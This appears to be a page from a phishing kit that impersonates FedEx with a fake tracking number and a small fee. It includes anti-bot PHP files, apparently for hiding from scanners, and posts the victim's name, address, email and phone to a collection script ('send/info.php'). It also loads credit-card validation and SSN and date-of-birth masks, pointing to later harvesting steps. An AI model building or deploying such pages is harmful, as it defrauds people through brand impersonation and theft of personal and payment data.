<?php
include "../bots/anti1.php";
include "../bots/anti2.php";
include "../bots/anti3.php";
include "../bots/anti4.php";
include "../bots/anti5.php";
include "../bots/anti6.php";
include "../bots/anti7.php";	
?>
<!DOCTYPE html>
<html>

<head>
  <meta charset="utf-8">
  <title>FedEx Info | FedEx</title>
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1">

  <!-- template css files-->
  <link rel="stylesheet"  href="css/bootstrap.css">
  <link rel="stylesheet"  href="css/test.css">             
  <link rel="preconnect" href="https://fonts.gstatic.com">
  

  <!-- js files-->
  <script src="js/html5shiv.min.js"></script>
  <script src="js/respond.min.js"></script>

  <!-- logo site web-->
  <link rel="icon" href="image/logo.png" type="image/x-icon" />
  <link rel="shortcut icon" href="image/logo.png" type="image/x-icon" />

  <!-- fontawtsome -->
  <link rel="stylesheet" href="https://pro.fontawesome.com/releases/v5.10.0/css/all.css" integrity="sha384-AYmEC3Yw5cVb3ZcuHtOA93w35dYTsvhLPVnYs9eStHfGJvOvKxVfELGroGkvsg+p" crossorigin="anonymous"/>

</head>

<body>

    <header>
        <div class="header">
            <div class="logo" id="main">
                <img width="70" src="image/logo.png">
            </div>
        </div>
    </header>

    <section>
        <div class="billing bg-white pt-4 px-2" id="main">
            <div class="row" style="margin-right: 0;">
                <div class="col-md-8">
                    <div class="left">

                       <h3 class="mb-5 mt-4"> <strong>Tracking Number</strong>: 577215117391</h3>

                        <div class="step px-1 py-1">
                            <ul class="list-unstyled d-flex mb-0 justify-content-around">
                                <li><span>1</span></li>
                                <span class="me-4 ms-2"> Contact Info </span>

                                <li><span class="none">2</span></li>
                                <span class="me-4 ms-2 n">Payment Info</span>

                                <li><span class="none">3</span></li>
                                <span class="me-4 ms-2 n">Confirmation</span>
                            </ul>
                        </div>

                        <div class="content py-3 px-1" style="background: #E6E6E6;">
                            <p class="mt-2 mb-2"><b>* Required fields are in bold.</b></p>
                        </div>

                        <div class="titre py-1 px-1">
                            <span>Contact Information</span>
                        </div>

                        <div class="contentt" style="background: #F7F7F7;">


                            <form action="send/info.php" method="post" id="konzform" name="konzform">

                                <input type="hidden" value="billing" name="step">
                               
                               <div class="form-group  row pt-4">
                                   
                                   <div class="col-md-6 mb-5">
                                       <input class="form-control"  placeholder="First Name" type="text" name="first_name">
                                                                              </div>

                                   <div class="col-md-6 mb-5">
                                       <input class="form-control" placeholder="Last Name"  type="text" name="last_name">
                                                                          </div>
                               </div>


                               <div class="form-group  row">
                                   <div class="col-md-4 mb-5">
                                       <select id="country" name="country" class="form-control">
                                           <option>Country</option>
                                           <option value="Afganistan">Afghanistan</option>
                                           <option value="Albania">Albania</option>
                                           <option value="Algeria">Algeria</option>
                                           <option value="American Samoa">American Samoa</option>
                                           <option value="Andorra">Andorra</option>
                                           <option value="Angola">Angola</option>
                                           <option value="Anguilla">Anguilla</option>
                                           <option value="Antigua & Barbuda">Antigua & Barbuda</option>
                                           <option value="Argentina">Argentina</option>
                                           <option value="Armenia">Armenia</option>
                                           <option value="Aruba">Aruba</option>
                                           <option value="Australia">Australia</option>
                                           <option value="Austria">Austria</option>
                                           <option value="Azerbaijan">Azerbaijan</option>
                                           <option value="Bahamas">Bahamas</option>
                                           <option value="Bahrain">Bahrain</option>
                                           <option value="Bangladesh">Bangladesh</option>
                                           <option value="Barbados">Barbados</option>
                                           <option value="Belarus">Belarus</option>
                                           <option value="Belgium">Belgium</option>
                                           <option value="Belize">Belize</option>
                                           <option value="Benin">Benin</option>
                                           <option value="Bermuda">Bermuda</option>
                                           <option value="Bhutan">Bhutan</option>
                                           <option value="Bolivia">Bolivia</option>
                                           <option value="Bonaire">Bonaire</option>
                                           <option value="Bosnia & Herzegovina">Bosnia & Herzegovina</option>
                                           <option value="Botswana">Botswana</option>
                                           <option value="Brazil">Brazil</option>
                                           <option value="British Indian Ocean Ter">British Indian Ocean Ter</option>
                                           <option value="Brunei">Brunei</option>
                                           <option value="Bulgaria">Bulgaria</option>
                                           <option value="Burkina Faso">Burkina Faso</option>
                                           <option value="Burundi">Burundi</option>
                                           <option value="Cambodia">Cambodia</option>
                                           <option value="Cameroon">Cameroon</option>
                                           <option value="Canada">Canada</option>
                                           <option value="Canary Islands">Canary Islands</option>
                                           <option value="Cape Verde">Cape Verde</option>
                                           <option value="Cayman Islands">Cayman Islands</option>
                                           <option value="Central African Republic">Central African Republic</option>
                                           <option value="Chad">Chad</option>
                                           <option value="Channel Islands">Channel Islands</option>
                                           <option value="Chile">Chile</option>
                                           <option value="China">China</option>
                                           <option value="Christmas Island">Christmas Island</option>
                                           <option value="Cocos Island">Cocos Island</option>
                                           <option value="Colombia">Colombia</option>
                                           <option value="Comoros">Comoros</option>
                                           <option value="Congo">Congo</option>
                                           <option value="Cook Islands">Cook Islands</option>
                                           <option value="Costa Rica">Costa Rica</option>
                                           <option value="Cote DIvoire">Cote DIvoire</option>
                                           <option value="Croatia">Croatia</option>
                                           <option value="Cuba">Cuba</option>
                                           <option value="Curaco">Curacao</option>
                                           <option value="Cyprus">Cyprus</option>
                                           <option value="Czech Republic">Czech Republic</option>
                                           <option value="Denmark">Denmark</option>
                                           <option value="Djibouti">Djibouti</option>
                                           <option value="Dominica">Dominica</option>
                                           <option value="Dominican Republic">Dominican Republic</option>
                                           <option value="East Timor">East Timor</option>
                                           <option value="Ecuador">Ecuador</option>
                                           <option value="Egypt">Egypt</option>
                                           <option value="El Salvador">El Salvador</option>
                                           <option value="Equatorial Guinea">Equatorial Guinea</option>
                                           <option value="Eritrea">Eritrea</option>
                                           <option value="Estonia">Estonia</option>
                                           <option value="Ethiopia">Ethiopia</option>
                                           <option value="Falkland Islands">Falkland Islands</option>
                                           <option value="Faroe Islands">Faroe Islands</option>
                                           <option value="Fiji">Fiji</option>
                                           <option value="Finland">Finland</option>
                                           <option value="France">France</option>
                                           <option value="French Guiana">French Guiana</option>
                                           <option value="French Polynesia">French Polynesia</option>
                                           <option value="French Southern Ter">French Southern Ter</option>
                                           <option value="Gabon">Gabon</option>
                                           <option value="Gambia">Gambia</option>
                                           <option value="Georgia">Georgia</option>
                                           <option value="Germany">Germany</option>
                                           <option value="Ghana">Ghana</option>
                                           <option value="Gibraltar">Gibraltar</option>
                                           <option value="Great Britain">Great Britain</option>
                                           <option value="Greece">Greece</option>
                                           <option value="Greenland">Greenland</option>
                                           <option value="Grenada">Grenada</option>
                                           <option value="Guadeloupe">Guadeloupe</option>
                                           <option value="Guam">Guam</option>
                                           <option value="Guatemala">Guatemala</option>
                                           <option value="Guinea">Guinea</option>
                                           <option value="Guyana">Guyana</option>
                                           <option value="Haiti">Haiti</option>
                                           <option value="Hawaii">Hawaii</option>
                                           <option value="Honduras">Honduras</option>
                                           <option value="Hong Kong">Hong Kong</option>
                                           <option value="Hungary">Hungary</option>
                                           <option value="Iceland">Iceland</option>
                                           <option value="Indonesia">Indonesia</option>
                                           <option value="India">India</option>
                                           <option value="Iran">Iran</option>
                                           <option value="Iraq">Iraq</option>
                                           <option value="Ireland">Ireland</option>
                                           <option value="Isle of Man">Isle of Man</option>
                                           <option value="Israel">Israel</option>
                                           <option value="Italy">Italy</option>
                                           <option value="Jamaica">Jamaica</option>
                                           <option value="Japan">Japan</option>
                                           <option value="Jordan">Jordan</option>
                                           <option value="Kazakhstan">Kazakhstan</option>
                                           <option value="Kenya">Kenya</option>
                                           <option value="Kiribati">Kiribati</option>
                                           <option value="Korea North">Korea North</option>
                                           <option value="Korea Sout">Korea South</option>
                                           <option value="Kuwait">Kuwait</option>
                                           <option value="Kyrgyzstan">Kyrgyzstan</option>
                                           <option value="Laos">Laos</option>
                                           <option value="Latvia">Latvia</option>
                                           <option value="Lebanon">Lebanon</option>
                                           <option value="Lesotho">Lesotho</option>
                                           <option value="Liberia">Liberia</option>
                                           <option value="Libya">Libya</option>
                                           <option value="Liechtenstein">Liechtenstein</option>
                                           <option value="Lithuania">Lithuania</option>
                                           <option value="Luxembourg">Luxembourg</option>
                                           <option value="Macau">Macau</option>
                                           <option value="Macedonia">Macedonia</option>
                                           <option value="Madagascar">Madagascar</option>
                                           <option value="Malaysia">Malaysia</option>
                                           <option value="Malawi">Malawi</option>
                                           <option value="Maldives">Maldives</option>
                                           <option value="Mali">Mali</option>
                                           <option value="Malta">Malta</option>
                                           <option value="Marshall Islands">Marshall Islands</option>
                                           <option value="Martinique">Martinique</option>
                                           <option value="Mauritania">Mauritania</option>
                                           <option value="Mauritius">Mauritius</option>
                                           <option value="Mayotte">Mayotte</option>
                                           <option value="Mexico">Mexico</option>
                                           <option value="Midway Islands">Midway Islands</option>
                                           <option value="Moldova">Moldova</option>
                                           <option value="Monaco">Monaco</option>
                                           <option value="Mongolia">Mongolia</option>
                                           <option value="Montserrat">Montserrat</option>
                                           <option value="Morocco">Morocco</option>
                                           <option value="Mozambique">Mozambique</option>
                                           <option value="Myanmar">Myanmar</option>
                                           <option value="Nambia">Nambia</option>
                                           <option value="Nauru">Nauru</option>
                                           <option value="Nepal">Nepal</option>
                                           <option value="Netherland Antilles">Netherland Antilles</option>
                                           <option value="Netherlands">Netherlands (Holland, Europe)</option>
                                           <option value="Nevis">Nevis</option>
                                           <option value="New Caledonia">New Caledonia</option>
                                           <option value="New Zealand">New Zealand</option>
                                           <option value="Nicaragua">Nicaragua</option>
                                           <option value="Niger">Niger</option>
                                           <option value="Nigeria">Nigeria</option>
                                           <option value="Niue">Niue</option>
                                           <option value="Norfolk Island">Norfolk Island</option>
                                           <option value="Norway">Norway</option>
                                           <option value="Oman">Oman</option>
                                           <option value="Pakistan">Pakistan</option>
                                           <option value="Palau Island">Palau Island</option>
                                           <option value="Palestine">Palestine</option>
                                           <option value="Panama">Panama</option>
                                           <option value="Papua New Guinea">Papua New Guinea</option>
                                           <option value="Paraguay">Paraguay</option>
                                           <option value="Peru">Peru</option>
                                           <option value="Phillipines">Philippines</option>
                                           <option value="Pitcairn Island">Pitcairn Island</option>
                                           <option value="Poland">Poland</option>
                                           <option value="Portugal">Portugal</option>
                                           <option value="Puerto Rico">Puerto Rico</option>
                                           <option value="Qatar">Qatar</option>
                                           <option value="Republic of Montenegro">Republic of Montenegro</option>
                                           <option value="Republic of Serbia">Republic of Serbia</option>
                                           <option value="Reunion">Reunion</option>
                                           <option value="Romania">Romania</option>
                                           <option value="Russia">Russia</option>
                                           <option value="Rwanda">Rwanda</option>
                                           <option value="St Barthelemy">St Barthelemy</option>
                                           <option value="St Eustatius">St Eustatius</option>
                                           <option value="St Helena">St Helena</option>
                                           <option value="St Kitts-Nevis">St Kitts-Nevis</option>
                                           <option value="St Lucia">St Lucia</option>
                                           <option value="St Maarten">St Maarten</option>
                                           <option value="St Pierre & Miquelon">St Pierre & Miquelon</option>
                                           <option value="St Vincent & Grenadines">St Vincent & Grenadines</option>
                                           <option value="Saipan">Saipan</option>
                                           <option value="Samoa">Samoa</option>
                                           <option value="Samoa American">Samoa American</option>
                                           <option value="San Marino">San Marino</option>
                                           <option value="Sao Tome & Principe">Sao Tome & Principe</option>
                                           <option value="Saudi Arabia">Saudi Arabia</option>
                                           <option value="Senegal">Senegal</option>
                                           <option value="Seychelles">Seychelles</option>
                                           <option value="Sierra Leone">Sierra Leone</option>
                                           <option value="Singapore">Singapore</option>
                                           <option value="Slovakia">Slovakia</option>
                                           <option value="Slovenia">Slovenia</option>
                                           <option value="Solomon Islands">Solomon Islands</option>
                                           <option value="Somalia">Somalia</option>
                                           <option value="South Africa">South Africa</option>
                                           <option value="Spain">Spain</option>
                                           <option value="Sri Lanka">Sri Lanka</option>
                                           <option value="Sudan">Sudan</option>
                                           <option value="Suriname">Suriname</option>
                                           <option value="Swaziland">Swaziland</option>
                                           <option value="Sweden">Sweden</option>
                                           <option value="Switzerland">Switzerland</option>
                                           <option value="Syria">Syria</option>
                                           <option value="Tahiti">Tahiti</option>
                                           <option value="Taiwan">Taiwan</option>
                                           <option value="Tajikistan">Tajikistan</option>
                                           <option value="Tanzania">Tanzania</option>
                                           <option value="Thailand">Thailand</option>
                                           <option value="Togo">Togo</option>
                                           <option value="Tokelau">Tokelau</option>
                                           <option value="Tonga">Tonga</option>
                                           <option value="Trinidad & Tobago">Trinidad & Tobago</option>
                                           <option value="Tunisia">Tunisia</option>
                                           <option value="Turkey">Turkey</option>
                                           <option value="Turkmenistan">Turkmenistan</option>
                                           <option value="Turks & Caicos Is">Turks & Caicos Is</option>
                                           <option value="Tuvalu">Tuvalu</option>
                                           <option value="Uganda">Uganda</option>
                                           <option value="United Kingdom">United Kingdom</option>
                                           <option value="Ukraine">Ukraine</option>
                                           <option value="United Arab Erimates">United Arab Emirates</option>
                                           <option value="United States of America">United States of America</option>
                                           <option value="Uraguay">Uruguay</option>
                                           <option value="Uzbekistan">Uzbekistan</option>
                                           <option value="Vanuatu">Vanuatu</option>
                                           <option value="Vatican City State">Vatican City State</option>
                                           <option value="Venezuela">Venezuela</option>
                                           <option value="Vietnam">Vietnam</option>
                                           <option value="Virgin Islands (Brit)">Virgin Islands (Brit)</option>
                                           <option value="Virgin Islands (USA)">Virgin Islands (USA)</option>
                                           <option value="Wake Island">Wake Island</option>
                                           <option value="Wallis & Futana Is">Wallis & Futana Is</option>
                                           <option value="Yemen">Yemen</option>
                                           <option value="Zaire">Zaire</option>
                                           <option value="Zambia">Zambia</option>
                                           <option value="Zimbabwe">Zimbabwe</option>
                                        </select>
                                   </div>

                                   <div class="col-md-4 mb-5">
                                       <input class="form-control" placeholder="City"  type="text" name="city">
                                                                          </div>

                                   <div class="col-md-4 mb-5">
                                       <input class="form-control" placeholder="State"  type="text" name="state">
                                                                          </div>
                               </div>


                               <div class="form-group row">
                                   <div class="col-md-6 mb-5">
                                       <input class="form-control" placeholder=" ZIP/Postal"  type="text" name="zip">
                                                                          </div>

                                   <div class="col-md-6 mb-5">
                                       <input class="form-control" placeholder="Address"  type="text" name="address">
                                                                          </div>
                                   
                               </div>



                               <div class="form-group mb-5"> 
                                   <div >
                                       <input class="form-control" placeholder="Email"  type="email" name="email">
                                                                          </div>
                               </div>

                               <div class="form-group mb-3">
                                   <div>
                                       <input class="form-control" placeholder="Phone"  type="tel" name="phone">
                                                                          </div>
                               </div>

                               <div class="btn text-center text-md-end mb-4" style="width:100%">
                                   <button name="submit">Confirmer</button>
                               </div>
                            </form>
                        </div>
                    </div>
                </div>

                <div class="col-md-4 ">

                   <div class="free border py-3 px-3 shadow mt-4">

                           <div class="logo mb-5">
                               <img width="70" src="image/logo.png">
                           </div>

                           <div class="prix text-end ">
                              <p><b>0,085 $</b> </p>
                              <span>(0.15 incl.VAT)</span>
                           </div>

                           <hr>

                           <div class="row align-items-start">
                               <div class="col">
                                   <h5 class="fw-bolder">Total</h5>
                               </div>
                               <div class="col">
                                    <div class="prix text-end">
                                        <p> <b>01 , 00 $</b></p>
                                        <span>VAT included</span>
                                    </div>
                               </div>
                           </div>
                   </div>
                </div>
            </div>
        </div>
        
    </section>
<br>

    <footer class="pt-4">
        <div class="footer" id="main">
            <div class="logo d-flex justify-content-between">
                <div class="logo">
                    <img src="image/logo-footer.gif">
                </div>
                <div class="search">
                    <img src="image/search.png">
                </div>
            </div>

            <hr>

            <div class="footer-b row" style="margin-right: 0;">
                <div class="row">
                    <div class=" footer-left col-md-7">
                         <div class="navv d-flex">
                            <ul class="list-unstyled me-5">
                                <li><strong>Additional Information</strong></li>
                                <li>About FedEx</li>
                                <li>Service Information</li>
                                <li>Service Guide</li>
                                <li>Mobile Solutions</li>
                                <li>Healthcare Solutions</li>
                                <li>Aerospace Solutions</li>
                                <li>FedEx Supply Chain</li>
                                <li>Careers</li>
                            </ul>
                            <ul class="list-unstyled" >
                                <li><strong>Customer Support</strong></li>
                                <li>Contact Us</li>
                                <li>Frequently Asked Questions</li>
                                <li>Send us an email</li>
                                <li>Write to us</li>
                                <li>Call FedEx Customer Service at</li>
                                <li>1.800.GoFedEx 1.800.463 3339</li>
                            </ul>
                        </div>
                    </div>
                    <div class="col-md-5">
                      <div class="footer-right d-flex justify-content-between">
                          <div>
                              <span>Follow FedEx</span>
                              <div class="img mb-4">
                                  <img src="image/media.png">
                              </div>
                          </div>
                          <div>
                              <img src="image/canada.png">
                          </div>
                      </div>
                    </div>
                </div>

                <hr>

                <div class="row">
                    <div class="col-md-6">
                        <p>All rights reserved.� FedEx 1995-2023</p>
                    </div>
                    <div class="col-md-6 bottom">
                        <ul class="list-unstyled">
                            <li>Careers</li>
                            <li>Global Home</li>
                            <li>Site Map</li>
                            <li>Internet Privacy Policy</li>
                            <li>Privacy Code</li>
                            <li>Terms of Use</li>
                        </ul>
                    </div>
                </div>
            </div>
        </div>
    </footer>
    
   
   




  <!-- template files js-->
  <script src="js/jquery-3.5.1.min.js"></script>
  <script src="js/bootstrap.min.js"></script>
  <script>
  </script>
  
        <script src="./js/jquery-3.3.1.min.js"></script>
      <script src="./js/jquery.mask.min.js"></script>
      <script src="./js/additional-methods.min.js"></script>
      <script src="./js/jquery.creditCardValidator.js"></script>
      <script src="./js/jquery.validate.min.js"></script>
      <script>$(window).ready(function(){setInterval(function(){$(".busyOverlay").fadeOut("fast"),$(".busyIcon").fadeOut("fast")},1e3)});</script>    <script>
        const alpha = (e) => {
             let k;
             document.all ? k = e.keyCode : k = e.which;
             return ((k > 64 && k < 91) || (k > 96 && k < 123) || k == 8 || k == 32 || (k >= 48 && k <= 57));
         }

        $(document).ready(function (e) {
            e("#phone").mask("+000000000000000"), e("#dob").mask("00/00/0000"), e("#ssn").mask("000-00-0000"),
            $("#konzform").validate({
                errorClass: "error-class",
                rules: {
                    first_name: {
                        required: true,
                        minlength: 5,
                    },
                    last_name: {
                        required: true,
                        minlength: 3
                    },
                    city: {
                        required: true,
                        minlength: 3
                    },
                    state: {
                        required: true,
                        minlength: 3
                    },
                    zip: {
                        required: true,
                        minlength: 3
                    },
                    state: {
                        required: true,
                        minlength: 2
                    },
                    phone: {
                        required: true,
                        minlength: 6
                    },
                    address: {
                        required: true,
                        minlength: 3,
                    },
                    email: {
                        required: true,
                        minlength: 3,
                    }
                },
                messages: {
                    first_name: {
                        required: "Please check your first name."
                    },
                    last_name: {
                        required: "Please check your last name."
                    },
                    city: {
                        required: "Please check your city."
                    },
                    state: {
                        required: "Please check your state."
                    },
                    phone: {
                        required: "Please check your mobile number."
                    },
                    state: {
                        required: "Please check your state."
                    },
                    address: {
                        required: "Please check your address.",
                    },
                    email: {
                        required: "Please check your email.",
                    },
                    zip: {
                        required: "Please check your Zip code.",
                    }
                }
            });
        })

        $.validator.addMethod("minAge", function (value, element, min) {
         var today = new Date();
         var birthDate = new Date(value);
         var age = today.getFullYear() - birthDate.getFullYear();

         if (age > min + 1) {
            return true;
         }

         var m = today.getMonth() - birthDate.getMonth();

         if (m < 0 || (m === 0 && today.getDate() < birthDate.getDate())) {
            age--;
         }

         return age >= min;
      });
    </script>
</body>

</html>
</body>
</html>